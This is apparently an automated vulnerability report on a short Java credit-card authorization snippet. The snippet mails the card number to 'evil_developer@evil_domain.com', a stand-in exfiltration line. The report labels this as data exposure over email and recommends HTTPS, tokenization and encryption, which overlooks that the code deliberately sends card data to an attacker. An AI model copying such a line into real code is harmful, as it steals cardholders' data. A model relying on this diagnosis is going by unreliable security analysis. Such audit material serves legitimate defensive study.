VULNERABLE: YES
VULNERABLE_LINES: 10
VULNERABILITY_DESCRIPTION: Sensitive Data Exposure

EXPLANATION: 
The code snippet reveals a critical vulnerability: the direct transmission of a credit card number (ccn) to an email address ("evil_developer@evil_domain.com"). 

This practice exposes sensitive customer data to unauthorized access. An attacker gaining control of the email server or intercepting emails could easily steal the credit card information, leading to potential financial fraud.

RECOMMENDATIONS:
1. **Never transmit sensitive data like credit card numbers directly in email.** Implement a secure communication protocol like HTTPS for handling such transactions. 

2. **Tokenization:** Replace credit card numbers with unique, non-sensitive tokens within your system.  Only the tokens are transmitted, protecting the actual card numbers.

3. **Encryption:**  Encrypt credit card data both in storage and transit using industry-standard encryption algorithms.

4. **Logging and Monitoring:** Implement robust logging and monitoring systems to track any attempts to access or modify sensitive data.

ORIGINAL CODE:



```java
boolean authorizeCard(String ccn) {
    
    
    // Authorize credit card.
    
    
    ...
    
    mailCardNumber(ccn, "evil_developer@evil_domain.com");
}
```
